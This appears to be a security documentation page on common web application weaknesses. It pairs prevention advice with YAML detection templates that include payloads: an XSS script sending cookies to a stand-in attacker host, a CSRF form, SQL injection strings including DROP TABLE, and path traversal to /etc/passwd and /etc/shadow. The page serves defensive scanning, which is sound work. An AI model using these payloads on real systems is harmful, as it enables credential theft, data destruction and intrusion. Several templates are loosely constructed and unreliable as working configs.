---
layout: default
title: Application Attacks
parent: Attacks
---

# Application Attacks
{: .no_toc }


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---




### Exposure of sensitive information

Exposure of sensitive information refers to the unintentional or unauthorized disclosure of confidential or private data to individuals or systems that are not supposed to have access to it. This can occur through various means, such as insecure storage, transmission, or handling of sensitive data.

Sensitive information can include personally identifiable information (PII) like names, addresses, social security numbers, financial data, login credentials, medical records, or any other data that, if exposed, could lead to identity theft, financial loss, or other harmful consequences.

To prevent exposure of sensitive information, it is important to implement appropriate security measures. Here are some preventive measures:

1. Data classification: Classify your data based on sensitivity and define access controls accordingly. Identify and categorize sensitive information so that you can apply stronger security measures to protect it.

1. Secure storage: Use secure storage mechanisms to protect sensitive data, such as encryption, hashing, or tokenization. Ensure that data is stored in a secure environment, whether it's in databases, file systems, or other storage mediums.

1. Secure transmission: Implement secure communication protocols, such as HTTPS, SSL/TLS, or other encryption mechanisms, when transmitting sensitive data over networks. This helps prevent eavesdropping or unauthorized interception of data during transit.

1. Access controls: Implement strong access controls to limit access to sensitive information. Use authentication and authorization mechanisms to ensure that only authorized individuals or systems can access and modify sensitive data.

1. Secure coding practices: Follow secure coding practices to avoid common vulnerabilities, such as injection attacks or insecure direct object references. Validate and sanitize user input to prevent malicious data from being processed or displayed.

1. Secure configuration: Ensure that your systems and applications are securely configured, including the use of strong passwords, disabling unnecessary services or features, and regularly updating and patching software to address security vulnerabilities.

1. Regular security assessments: Conduct regular security assessments, including vulnerability scanning and penetration testing, to identify any potential weaknesses or vulnerabilities that could lead to the exposure of sensitive information.

1. Employee training and awareness: Train your employees on security best practices, including how to handle sensitive information, the importance of data protection, and how to recognize and report security incidents or suspicious activities.

1. Data minimization: Collect and retain only the necessary data. Avoid storing or keeping sensitive information for longer than necessary.

1. Privacy by design: Incorporate privacy and security considerations into the design and development of your systems and applications. Implement privacy-enhancing technologies and practices from the outset.

By implementing these preventive measures and adopting a comprehensive approach to data security, you can significantly reduce the risk of sensitive information exposure and protect the privacy and confidentiality of your data.



```
id: exposure-sensitive-information
info:
  name: Exposure of Sensitive Information
  author: Your Name
  severity: medium
  description: Detects potential exposure of sensitive information in web applications.
  references:
    - https://example.com
tags:
  - web
  - sensitive-information
requests:
  - name: Exposed Secrets
    path:
      - /
      - /admin
    matchers:
      - type: word
        words:
          - api_key
          - password
          - secret_key
    attacks:
      - type: word
        words:
          - error
          - unauthorized
      - type: word
        words:
          - access denied
          - forbidden
```




### Insertion of Sensitive Information Into Sent Data

Insertion of sensitive information into sent data refers to the inadvertent inclusion of confidential or private data into logs, error messages, debug output, or any other form of data that is sent or logged externally. This can occur when sensitive information, such as passwords, API keys, or personally identifiable information (PII), is included in plaintext or unencrypted form, making it accessible to unauthorized individuals or systems.

To prevent the insertion of sensitive information into sent data, you can follow these preventive measures:

1. Data masking: Avoid including sensitive information in logs, error messages, or any other form of output. Implement data masking techniques, such as replacing sensitive data with placeholders or obfuscating it, to prevent the exposure of sensitive information.

1. Secure logging: Configure logging mechanisms to exclude sensitive information from being logged. Implement proper log filtering or redaction techniques to remove or mask sensitive data before it is written to log files.

1. Context-based logging: When logging or outputting data, consider the context and purpose of the logged information. Exclude any unnecessary or sensitive data from being included in the logs or output.

1. Tokenization or encryption: If it is necessary to include sensitive information in logs or output for debugging or troubleshooting purposes, tokenize or encrypt the sensitive data to render it unreadable. Ensure that only authorized individuals or systems have access to the keys or tokens required for decryption.

1. Secure error handling: When handling errors, avoid displaying sensitive information in error messages presented to users. Instead, provide generic error messages that do not reveal specific details about the underlying sensitive data or system.

1. Secure coding practices: Follow secure coding practices to prevent unintentional insertion of sensitive information into sent data. Ensure that sensitive data is properly handled, encrypted, or obfuscated throughout the application's lifecycle.

1. Data separation: Consider separating sensitive data from other non-sensitive data, both in storage and during transmission. Implement proper data segregation mechanisms to reduce the risk of sensitive information being inadvertently included in sent data.

1. Regular code reviews and testing: Conduct regular code reviews and security testing to identify any potential areas where sensitive information might be included in sent data. Perform thorough testing to ensure that sensitive data is not exposed during normal system operations or error conditions.

1. Employee training and awareness: Train your development team and system administrators about the importance of handling sensitive information securely. Educate them on best practices for data protection and the potential risks associated with the insertion of sensitive information into sent data.

By implementing these preventive measures, you can reduce the risk of sensitive information being inadvertently included in sent data, protecting the confidentiality and privacy of your data and minimizing the potential impact of a security breach.



```
id: insertion-sensitive-information
info:
  name: Insertion of Sensitive Information Into Sent Data
  author: Your Name
  severity: high
  description: Detects potential insertion of sensitive information into sent data in web applications.
  references:
    - https://example.com
tags:
  - web
  - sensitive-information
requests:
  - name: Email Leakage
    path:
      - /
      - /login
    matchers:
      - type: word
        words:
          - email
    attacks:
      - type: word
        words:
          - @example.com
      - type: word
        words:
          - .com
          - .net
  - name: Credit Card Data Leakage
    path:
      - /checkout
    matchers:
      - type: regex
        part: body
        words:
          - '[0-9]{16}'
          - '[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}'
    attacks:
      - type: word
        words:
          - found
          - exposed
```



### Cross-Site Request Forgery (CSRF)


Cross-Site Request Forgery (CSRF) is a type of web vulnerability where an attacker tricks a victim into unknowingly executing unwanted actions on a web application in which the victim is authenticated. The attack occurs when the victim visits a malicious website or clicks on a specially crafted link, resulting in unauthorized actions being performed on their behalf on the targeted web application.

To prevent Cross-Site Request Forgery attacks, you can follow these preventive measures:

1. CSRF tokens: Implement CSRF tokens as a defense mechanism. Include a unique token in each HTML form or request that modifies state on the server. This token should be validated on the server-side to ensure that the request is legitimate and originated from the same site.

1. Same-Site cookies: Set the SameSite attribute on your session cookies to Strict or Lax. This prevents cookies from being sent in cross-origin requests, effectively mitigating CSRF attacks.

1. Anti-CSRF frameworks: Utilize anti-CSRF frameworks or libraries provided by your web development framework. These frameworks often automate the generation and validation of CSRF tokens, making it easier to implement and maintain protection against CSRF attacks.

1. Unique session identifiers: Ensure that each user session has a unique identifier. This helps prevent session fixation attacks, which could be used in combination with CSRF attacks.

1. Request validation: Validate the integrity and authenticity of incoming requests on the server-side. Check for the presence and correctness of CSRF tokens, referer headers, or other request attributes that can help identify the origin of the request.

1. Strict access controls: Enforce strict access controls on sensitive operations and resources. Implement proper authentication and authorization mechanisms to ensure that only authorized users can perform critical actions.

1. User awareness: Educate your users about the risks of CSRF attacks and encourage them to be cautious when clicking on links or visiting unfamiliar websites. Provide guidance on recognizing and reporting suspicious behavior.

1. Secure coding practices: Follow secure coding practices to minimize the risk of introducing vulnerabilities. Validate and sanitize user input, implement proper access controls, and regularly update and patch your software to address any potential security vulnerabilities.

1. Security testing: Perform regular security testing, including vulnerability scanning and penetration testing, to identify and address any potential CSRF vulnerabilities in your web application.

By implementing these preventive measures and maintaining a strong security posture, you can significantly reduce the risk of Cross-Site Request Forgery attacks and protect the integrity of your web application and user data.




```
id: csrf
info:
  name: Cross-Site Request Forgery (CSRF)
  author: Your Name
  severity: high
  description: Detects potential Cross-Site Request Forgery vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - csrf
requests:
  - name: CSRF Token Check
    path:
      - /
      - /profile
      - /admin
    matchers:
      - type: word
        words:
          - csrf_token
          - authenticity_token
    attacks:
      - type: word
        words:
          - <form action="http://malicious-site.com/attack" method="POST">
      - type: regex
        part: body
        words:
          - '<input type="hidden" name="_token" value="[^"]+">'
          - '<input type="hidden" name="csrf_token" value="[^"]+">'
```




### Use of Hard-coded Password

The use of hard-coded passwords refers to the practice of embedding passwords directly into source code or configuration files, making them easily discoverable by anyone with access to the code or files. This is considered a poor security practice as it can lead to unauthorized access and compromise of sensitive information.

To prevent the use of hard-coded passwords, you can follow these preventive measures:

1. Use secure credential storage: Instead of hard-coding passwords, utilize secure credential storage mechanisms provided by your development platform or framework. These mechanisms allow you to securely store and retrieve passwords, such as using secure key stores, environment variables, or configuration files with restricted access.

1. Implement authentication mechanisms: Implement proper authentication mechanisms instead of relying solely on hard-coded passwords. Use strong password hashing algorithms, salted hashes, or better yet, consider using more secure authentication methods like token-based authentication or OAuth.

1. Separate configuration from code: Keep sensitive information, including passwords, separate from your codebase. Store them in secure configuration files or use environment variables to store sensitive configuration details. Ensure that these files or variables are not accessible by unauthorized individuals.

1. Apply access controls: Limit access to configuration files or secure credential storage to only authorized individuals or systems. Follow the principle of least privilege, granting access only to those who need it for operational purposes.

1. Utilize secrets management tools: Leverage secrets management tools or platforms that provide secure storage, rotation, and access control for sensitive information such as passwords, API keys, and cryptographic keys. These tools often offer encryption, access logging, and additional security features to protect your secrets.

1. Secure deployment process: Implement secure deployment practices to ensure that passwords are not exposed during deployment or in version control systems. Avoid including sensitive information in code repositories or build artifacts.

1. Regularly rotate passwords: Enforce a password rotation policy to regularly update passwords. This reduces the impact of compromised credentials and limits the window of opportunity for attackers.

1. Secure code review: Conduct regular code reviews to identify and remove any instances of hard-coded passwords. Train developers to be aware of the risks associated with hard-coding passwords and provide them with secure alternatives and best practices.

1. Automated security tools: Use automated security scanning tools or static code analysis tools to identify instances of hard-coded passwords and other security vulnerabilities in your codebase.

By implementing these preventive measures, you can minimize the risk of hard-coded passwords and enhance the security of your application and sensitive data. It is crucial to follow secure coding practices, regularly review and update security controls, and stay informed about emerging best practices and vulnerabilities to maintain a strong security posture.


```
id: hard-coded-password
info:
  name: Use of Hard-coded Password
  author: Your Name
  severity: high
  description: Detects the use of hard-coded passwords in source code or configuration files.
  references:
    - https://example.com
tags:
  - credentials
requests:
  - name: Hard-coded Password Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - password
          - secret
          - api_key
    attacks:
      - type: regex
        part: body
        words:
          - 'password = ".*"'
          - 'password: ".*"'
          - 'password: .*'
      - type: regex
        part: body
        words:
          - 'secret = ".*"'
          - 'secret: ".*"'
          - 'secret: .*'
      - type: regex
        part: body
        words:
          - 'api_key = ".*"'
          - 'api_key: ".*"'
          - 'api_key: .*'
```



### Broken or Risky Crypto Algorithm

A broken or risky cryptographic algorithm refers to the use of encryption or hashing algorithms that have known vulnerabilities or weaknesses. These vulnerabilities could be due to outdated or deprecated algorithms, insecure key sizes, poor implementation, or inadequate cryptographic practices. Such weaknesses can be exploited by attackers, potentially compromising the confidentiality, integrity, or authenticity of sensitive data.

To prevent the use of broken or risky crypto algorithms, you can follow these preventive measures:

1. Stay updated with cryptographic standards: Keep abreast of the latest cryptographic standards and recommendations from reputable sources, such as NIST (National Institute of Standards and Technology) or IETF (Internet Engineering Task Force). Stay informed about any vulnerabilities or weaknesses discovered in existing algorithms and make necessary updates to your cryptographic implementations.

1. Use strong and approved algorithms: Select cryptographic algorithms that are widely recognized, thoroughly tested, and recommended by cryptographic experts. Examples of secure algorithms include AES (Advanced Encryption Standard) for symmetric encryption, RSA or ECDSA for asymmetric encryption, and SHA-256 or SHA-3 for hashing.

1. Avoid deprecated or weakened algorithms: Stay away from deprecated or weakened cryptographic algorithms, such as DES (Data Encryption Standard) or MD5 (Message Digest Algorithm 5). These algorithms have known vulnerabilities and are no longer considered secure for most applications.

1. Use appropriate key sizes: Ensure that the key sizes used in your cryptographic algorithms are appropriate for the level of security required. Use key sizes recommended by cryptographic standards, taking into account the strength of the algorithm and the anticipated lifespan of the data being protected.

1. Secure key management: Implement robust key management practices, including the secure generation, storage, and distribution of cryptographic keys. Protect keys from unauthorized access, and regularly rotate or update keys as per best practices.

1. Use secure random number generation: Cryptographic operations often rely on random numbers for key generation, initialization vectors, and nonces. Use a cryptographically secure random number generator (CSPRNG) to ensure the randomness and unpredictability of these values.

1. Third-party library evaluation: When using cryptographic libraries or frameworks, evaluate their reputation, security track record, and community support. Choose well-established libraries that have undergone security audits and are actively maintained to minimize the risk of using broken or insecure crypto algorithms.

1. Independent security reviews: Conduct independent security reviews or audits of your cryptographic implementations to identify any weaknesses, vulnerabilities, or misconfigurations. Engage security professionals or external auditors with expertise in cryptography to assess your cryptographic practices.

1. Ongoing monitoring and updates: Stay vigilant about emerging cryptographic vulnerabilities or attacks. Monitor security advisories and updates from cryptographic standards organizations, vendors, and the broader security community. Apply patches, updates, or configuration changes as necessary to address any identified vulnerabilities.

By following these preventive measures and adopting strong cryptographic practices, you can significantly reduce the risk of using broken or risky crypto algorithms and enhance the security of your application's sensitive data. It is essential to maintain an active stance in staying informed about cryptographic best practices and evolving security threats to ensure the continued security of your cryptographic implementations.



```
id: broken-crypto-algorithm
info:
  name: Broken or Risky Crypto Algorithm
  author: Your Name
  severity: medium
  description: Detects the use of broken or risky cryptographic algorithms in TLS configurations or code.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Weak Crypto Algorithm Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - ssl_version
          - cipher_suite
          - crypto_algorithm
    attacks:
      - type: regex
        part: body
        words:
          - 'ssl_version = ".*"'
          - 'cipher_suite = ".*"'
          - 'crypto_algorithm = ".*"'
      - type: regex
        part: body
        words:
          - 'ssl_version: ".*"'
          - 'cipher_suite: ".*"'
          - 'crypto_algorithm: ".*"'
      - type: regex
        part: body
        words:
          - 'algorithm = ".*"'
          - 'algorithm: ".*"'
```


### Risky Crypto Algorithm


A broken or risky cryptographic algorithm refers to the use of encryption or hashing algorithms that have known vulnerabilities or weaknesses. These vulnerabilities could be due to outdated or deprecated algorithms, insecure key sizes, poor implementation, or inadequate cryptographic practices. Such weaknesses can be exploited by attackers, potentially compromising the confidentiality, integrity, or authenticity of sensitive data.

To prevent the use of broken or risky crypto algorithms, you can follow these preventive measures:

1. Stay updated with cryptographic standards: Keep abreast of the latest cryptographic standards and recommendations from reputable sources, such as NIST (National Institute of Standards and Technology) or IETF (Internet Engineering Task Force). Stay informed about any vulnerabilities or weaknesses discovered in existing algorithms and make necessary updates to your cryptographic implementations.

1. Use strong and approved algorithms: Select cryptographic algorithms that are widely recognized, thoroughly tested, and recommended by cryptographic experts. Examples of secure algorithms include AES (Advanced Encryption Standard) for symmetric encryption, RSA or ECDSA for asymmetric encryption, and SHA-256 or SHA-3 for hashing.

1. Avoid deprecated or weakened algorithms: Stay away from deprecated or weakened cryptographic algorithms, such as DES (Data Encryption Standard) or MD5 (Message Digest Algorithm 5). These algorithms have known vulnerabilities and are no longer considered secure for most applications.

1. Use appropriate key sizes: Ensure that the key sizes used in your cryptographic algorithms are appropriate for the level of security required. Use key sizes recommended by cryptographic standards, taking into account the strength of the algorithm and the anticipated lifespan of the data being protected.

1. Secure key management: Implement robust key management practices, including the secure generation, storage, and distribution of cryptographic keys. Protect keys from unauthorized access, and regularly rotate or update keys as per best practices.

1. Use secure random number generation: Cryptographic operations often rely on random numbers for key generation, initialization vectors, and nonces. Use a cryptographically secure random number generator (CSPRNG) to ensure the randomness and unpredictability of these values.

1. Third-party library evaluation: When using cryptographic libraries or frameworks, evaluate their reputation, security track record, and community support. Choose well-established libraries that have undergone security audits and are actively maintained to minimize the risk of using broken or insecure crypto algorithms.

Independent security reviews: Conduct independent security reviews or audits of your cryptographic implementations to identify any weaknesses, vulnerabilities, or misconfigurations. Engage security professionals or external auditors with expertise in cryptography to assess your cryptographic practices.

1. Ongoing monitoring and updates: Stay vigilant about emerging cryptographic vulnerabilities or attacks. Monitor security advisories and updates from cryptographic standards organizations, vendors, and the broader security community. Apply patches, updates, or configuration changes as necessary to address any identified vulnerabilities.

By following these preventive measures and adopting strong cryptographic practices, you can significantly reduce the risk of using broken or risky crypto algorithms and enhance the security of your application's sensitive data. It is essential to maintain an active stance in staying informed about cryptographic best practices and evolving security threats to ensure the continued security of your cryptographic implementations.


```
id: risky-crypto-algorithm
info:
  name: Risky Crypto Algorithm
  author: Your Name
  severity: medium
  description: Detects the use of risky cryptographic algorithms in TLS configurations or code.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Risky Crypto Algorithm Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - ssl_version
          - cipher_suite
          - crypto_algorithm
    attacks:
      - type: regex
        part: body
        words:
          - 'ssl_version = ".*"'
          - 'cipher_suite = ".*"'
          - 'crypto_algorithm = "MD5|SHA1|RC4|DES"'
      - type: regex
        part: body
        words:
          - 'ssl_version: ".*"'
          - 'cipher_suite: ".*"'
          - 'crypto_algorithm: "MD5|SHA1|RC4|DES"'
      - type: regex
        part: body
        words:
          - 'algorithm = "MD5|SHA1|RC4|DES"'
          - 'algorithm: "MD5|SHA1|RC4|DES"'
```


### Insufficient Entropy


Insufficient entropy refers to a lack of randomness or unpredictability in the generation of cryptographic keys, random numbers, or other security-critical values. Insufficient entropy can weaken cryptographic algorithms and make them more susceptible to brute-force attacks or other cryptographic attacks.

To prevent insufficient entropy, you can follow these preventive measures:

1. Use a cryptographically secure random number generator (CSPRNG): Use a CSPRNG instead of relying on pseudo-random number generators (PRNGs) or non-secure random sources. A CSPRNG ensures that the generated random numbers are sufficiently unpredictable and suitable for cryptographic purposes.

1. Collect entropy from diverse sources: Gather entropy from a variety of sources, such as hardware events (e.g., mouse movements, keyboard presses, disk activity), system-level events, environmental factors, or dedicated hardware random number generators. Combine these entropy sources to increase the randomness and unpredictability of the generated values.

1. Periodically reseed the random number generator: Regularly reseed the random number generator with fresh entropy to maintain a high level of randomness. This helps prevent the depletion of entropy over time.

1. Use hardware-based random number generation: If available, consider utilizing dedicated hardware random number generators (RNGs) that provide a high degree of randomness. These RNGs use physical processes, such as electronic noise or radioactive decay, to generate random values.

1. Test and monitor entropy levels: Implement mechanisms to test and monitor the entropy levels in your system. You can use tools or libraries to assess the quality of randomness and ensure that it meets the required entropy threshold. Monitor entropy pools to identify any potential depletion or insufficient entropy conditions.

1. Avoid deterministic algorithms for key generation: Use algorithms that incorporate randomness and avoid deterministic algorithms for key generation. Deterministic algorithms generate the same output for the same input, making them predictable and susceptible to attacks.

1. Periodically rotate cryptographic keys: Regularly rotate cryptographic keys, especially for long-lived cryptographic operations. This minimizes the impact of compromised keys and provides an opportunity to introduce fresh entropy during the key generation process.

1. Perform security testing and code review: Conduct security testing, including vulnerability scanning and code review, to identify any weaknesses or vulnerabilities related to entropy generation. Review the implementation of random number generation functions and ensure they meet cryptographic best practices.

1. Follow cryptographic standards and best practices: Adhere to established cryptographic standards, guidelines, and best practices. Standards organizations like NIST and IETF provide recommendations and guidelines for generating and managing cryptographic keys, random numbers, and entropy.

By implementing these preventive measures, you can enhance the entropy generation process and ensure the strength and unpredictability of cryptographic operations. It is crucial to regularly assess and update your entropy generation mechanisms to adapt to evolving security requirements and best practices.


```
id: insufficient-entropy
info:
  name: Insufficient Entropy
  author: Your Name
  severity: medium
  description: Detects the usage of weak or insufficient entropy sources in cryptographic operations.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Insufficient Entropy Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - entropy
    attacks:
      - type: regex
        part: body
        words:
          - 'entropy = [0-7]\.\d{1,}'
          - 'entropy: [0-7]\.\d{1,}'
      - type: regex
        part: body
        words:
          - 'weak_entropy = true'
          - 'weak_entropy: true'
      - type: regex
        part: body
        words:
          - 'insufficient_entropy = true'
          - 'insufficient_entropy: true'
```



### XSS


XSS (Cross-Site Scripting) is a type of web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It occurs when user-supplied data is improperly validated or escaped and is directly included in a web page without proper sanitization.

To prevent XSS attacks, you can follow these preventive measures:

1. Input validation and filtering: Validate and sanitize all user-generated input, including form fields, URL parameters, and HTTP headers. Apply input validation to ensure that only expected data types and formats are accepted. Filter out or escape characters that can be used for malicious purposes, such as HTML tags, JavaScript code, or SQL commands.

1. Use secure coding practices: Implement secure coding practices that promote the separation of code and data. Use appropriate context-aware output encoding or escaping techniques when displaying user-supplied data in HTML, JavaScript, CSS, or other contexts.

1. Use a secure templating system: If using a templating system, make sure it automatically escapes or sanitizes user input by default. Avoid using string concatenation or manual HTML construction for displaying user-supplied data.

1. Content Security Policy (CSP): Implement and enforce a Content Security Policy that restricts the types of content that can be loaded or executed on a web page. CSP helps mitigate XSS attacks by defining the sources from which various content, such as scripts or stylesheets, can be loaded.

1. HTTP-only cookies: Use the HttpOnly flag when setting cookies to prevent client-side scripts from accessing sensitive cookies. This helps protect against session hijacking attacks.

1. Escape output appropriately: When dynamically generating HTML, JavaScript, or other content, ensure that user-supplied data is properly escaped to prevent it from being interpreted as code. Use context-aware escaping functions provided by your programming framework or language.

1. Secure development frameworks and libraries: Utilize secure development frameworks and libraries that have built-in protections against XSS attacks. These frameworks often provide mechanisms to automatically escape or sanitize user input when rendering templates or generating HTML.

1. Regularly update and patch: Keep all web application components, including frameworks, libraries, and plugins, up to date with the latest security patches. XSS vulnerabilities may be discovered in these components, and updates often address these vulnerabilities.

1. Educate and train developers: Provide security training and awareness programs to developers to educate them about the risks of XSS attacks and secure coding practices. Teach them how to properly validate, sanitize, and escape user input to prevent XSS vulnerabilities.

1. Penetration testing and security scanning: Regularly conduct penetration testing and security scanning to identify any XSS vulnerabilities in your web application. Utilize automated vulnerability scanners or engage security professionals to perform manual security assessments.

By following these preventive measures, you can significantly reduce the risk of XSS attacks and protect your web application and users from potential malicious activities. It is essential to implement a layered approach to security, combining secure coding practices, input validation, output encoding, and regular security testing to maintain a strong defense against XSS vulnerabilities.


```
id: xss
info:
  name: Cross-Site Scripting (XSS)
  author: Your Name
  severity: high
  description: Detects potential Cross-Site Scripting vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - xss
requests:
  - name: XSS Payload Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: fuzz
        payloads:
          - '<script>alert("XSS");</script>'
          - '<img src=x onerror=alert("XSS")>'
          - '<svg/onload=alert("XSS")>'
          - '<script>location.href="https://attacker.com/cookie.php?cookie="+document.cookie;</script>'
      - type: regex
        part: body
        words:
          - 'document\.cookie'
          - 'eval\('
          - 'on\w+=.*[\'"]'
```




### SQL Injection


SQL Injection is a web application vulnerability that occurs when an attacker is able to manipulate an SQL query by inserting malicious SQL code. It happens when user-supplied input is not properly validated or sanitized and is directly concatenated into an SQL statement, allowing the attacker to execute unauthorized database operations, view sensitive data, or modify the database.

To prevent SQL Injection attacks, you can follow these preventive measures:

1. Use parameterized queries or prepared statements: Instead of dynamically building SQL queries by concatenating user input, use parameterized queries or prepared statements. These mechanisms allow you to separate the SQL code from the user-supplied input, preventing the injection of malicious SQL code.

1. Input validation and sanitization: Validate and sanitize all user-generated input before using it in SQL queries. Validate input to ensure it matches the expected data type, length, and format. Sanitize input by removing or escaping special characters that can be used for SQL injection, such as single quotes or semicolons.

1. Avoid dynamic SQL queries: Whenever possible, avoid dynamically building SQL queries using string concatenation. Instead, use ORM (Object-Relational Mapping) frameworks or query builders that provide built-in protection against SQL injection. These frameworks automatically handle the proper escaping and parameter binding.

1. Least privilege principle: Ensure that the database user account used by the web application has the least privilege necessary to perform its required operations. Restrict the permissions to only those specific tables and operations required by the application, reducing the potential impact of a successful SQL injection attack.

1. Securely manage database credentials: Store and manage database credentials securely. Avoid hard-coding credentials in the source code or configuration files. Instead, use secure credential storage mechanisms such as environment variables or secure key stores.

1. Implement input validation on the server-side: While client-side input validation provides a better user experience, it should not be solely relied upon for security. Always perform input validation and sanitization on the server-side as well, as client-side validation can be bypassed or manipulated.

1. Regularly update and patch: Keep your database management system (DBMS) up to date with the latest security patches. DBMS vendors often release updates to address security vulnerabilities, including those related to SQL injection.

1. Implement strong access controls: Implement strong access controls at the application level to restrict user access and actions. Use role-based access control (RBAC) and properly authenticate and authorize users to ensure they only have access to the appropriate resources and actions.

1. Security testing and code review: Conduct regular security testing, including penetration testing and code review, to identify any SQL injection vulnerabilities in your web application. Utilize automated vulnerability scanners and engage security professionals to perform manual security assessments.

1. Secure development practices: Promote secure coding practices within your development team. Educate developers about the risks of SQL injection and provide training on secure coding techniques and best practices. Encourage the use of secure coding frameworks and libraries that offer protection against SQL injection.

By implementing these preventive measures, you can significantly reduce the risk of SQL Injection attacks and protect your web application from unauthorized database access or manipulation. It is important to adopt a proactive approach to security, combining secure coding practices, input validation, parameterized queries, and regular security testing to maintain the integrity and security of your application's database interactions.


```
id: sql-injection
info:
  name: SQL Injection
  author: Your Name
  severity: high
  description: Detects potential SQL Injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - sql-injection
requests:
  - name: SQL Injection Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: fuzz
        payloads:
          - "' OR 1=1 --"
          - "'; DROP TABLE users; --"
          - "'; SELECT * FROM users; --"
      - type: regex
        part: body
        words:
          - 'error in your SQL syntax'
          - 'mysql_fetch_array()'
          - 'sqlite_fetch_array()'
```


### External Control of File Name or Path

External Control of File Name or Path is a vulnerability that occurs when an attacker can manipulate the file name or path used in file operations, leading to unintended or unauthorized access to files on the system. This vulnerability can be exploited to read, overwrite, or execute arbitrary files, potentially compromising the security and integrity of the application and the underlying system.

To prevent External Control of File Name or Path vulnerabilities, you can follow these preventive measures:

1. Validate and sanitize file inputs: Validate and sanitize any file-related inputs received from users or external sources. Verify that the file names or paths conform to the expected format and do not contain any unexpected or malicious characters. Sanitize the input by removing or escaping any characters that can be used for path traversal or command injection.

1. Use whitelisting: Implement a whitelist approach for allowed file names or paths. Define a list of permitted characters, file extensions, or directory paths that are considered safe and reject any inputs that do not match the whitelist. This helps prevent unauthorized access to sensitive files or system directories.

1. Avoid user-controlled file names or paths: Whenever possible, avoid using user-supplied input directly as file names or paths. Generate file names or paths programmatically using trusted and validated data sources, such as a database or internal configuration. If user input is necessary, consider using a secure file upload mechanism that stores uploaded files in a designated, non-executable directory.

1. Restrict file system access permissions: Set appropriate access permissions on files and directories to limit the privileges of the application or process accessing them. Ensure that the application runs with the least privilege necessary to perform its operations and restrict access to sensitive files or system directories.

1. Use platform-specific secure file APIs: Utilize secure file access APIs provided by the programming language or framework you're using. These APIs often include built-in protections against path traversal attacks or command injection. Avoid using low-level file system access methods that may be more susceptible to vulnerabilities.

1. Implement file access controls: Implement proper file access controls within your application. Authenticate and authorize users to ensure they have the necessary permissions to access specific files or directories. Enforce file-level access controls based on user roles or privileges.

1. Secure file upload and download: Implement secure file upload and download mechanisms that validate file types, check file sizes, and perform virus/malware scanning. Restrict the allowed file extensions, set size limits, and ensure the uploaded files are stored in a secure location.

1. Regularly update and patch: Keep the underlying operating system, libraries, and dependencies up to date with the latest security patches. Patches often address vulnerabilities related to file system operations and can help mitigate the risk of external control of file name or path attacks.

1. Security testing and code review: Conduct regular security testing, including penetration testing and code review, to identify any vulnerabilities related to file operations. Utilize automated vulnerability scanners or engage security professionals to perform manual security assessments.

1. Educate developers: Provide training and education to developers about secure file handling practices and the risks associated with external control of file name or path vulnerabilities. Promote secure coding techniques and best practices within your development team.

By implementing these preventive measures, you can significantly reduce the risk of external control of file name or path vulnerabilities and protect your application from unauthorized file access or manipulation. It is crucial to follow secure coding practices, validate and sanitize file inputs, and regularly update your systems to address any emerging security issues.


```
id: file-path-injection
info:
  name: External Control of File Name or Path
  author: Your Name
  severity: medium
  description: Detects potential file path injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - file-path-injection
requests:
  - name: File Path Injection Test
    path:
      - /
      - /download
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/download?file={{.Fuzz}}"
            headers:
              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
            fuzz:
              - "../../../../etc/passwd"
              - "../../../../etc/shadow"
              - "../../../../etc/hosts"
```



### Generation of Error Message Containing Sensitive Information

The Generation of Error Message Containing Sensitive Information is a vulnerability that occurs when error messages generated by an application reveal sensitive or confidential information. This can include details such as database connection strings, stack traces, user credentials, or other sensitive data. Attackers can exploit this information to gain insights into the system's architecture, identify potential weaknesses, or launch further attacks.

To prevent the generation of error messages containing sensitive information, you can follow these preventive measures:

1. Disable detailed error messages in production: Ensure that your application's production environment is configured to display generic error messages instead of detailed technical information. This helps to prevent the inadvertent exposure of sensitive data in error messages.

1. Implement custom error handling: Create custom error handling mechanisms that capture and handle application errors without disclosing sensitive information. Customize error messages to provide generic and user-friendly feedback to users, without revealing specific technical details.

1. Log errors securely: If your application logs errors, ensure that sensitive information is not included in the log entries. Review your logging configuration to ensure that only necessary information is logged, and sanitize any logged data to remove sensitive details.

1. Avoid displaying sensitive information: Avoid displaying sensitive information in error messages altogether. Refrain from including sensitive data such as user credentials, database connection strings, or internal system paths in error messages. Instead, focus on providing useful and actionable information to users without revealing sensitive details.

1. Use exception handling best practices: Employ proper exception handling techniques in your code. Catch and handle exceptions gracefully, avoiding the propagation of sensitive information in error messages. Implement structured exception handling mechanisms to capture and handle errors effectively.

1. Regularly test error handling: Perform thorough testing of your application's error handling mechanisms. Include scenarios where exceptions are intentionally triggered to ensure that sensitive information is not disclosed in error messages. Use automated vulnerability scanning tools or engage security professionals to identify potential information leakage.

1. Implement input validation and sanitization: Validate and sanitize user input to prevent malicious input from triggering errors that reveal sensitive information. Proper input validation helps to prevent common attack vectors, such as injection attacks, that can lead to the generation of error messages containing sensitive data.

1. Follow secure coding practices: Adhere to secure coding practices and guidelines. Keep sensitive information separate from error messages and ensure that error handling code is robust and secure. Apply secure coding principles throughout the development lifecycle to minimize the likelihood of vulnerabilities.

1. Regularly update and patch: Keep your application and its dependencies up to date with the latest security patches. Software updates often address security vulnerabilities, including those related to error handling and the potential exposure of sensitive information.

1. Educate developers: Provide training and awareness programs to educate developers about the risks associated with error messages containing sensitive information. Promote secure coding practices and emphasize the importance of properly handling and securing error messages.

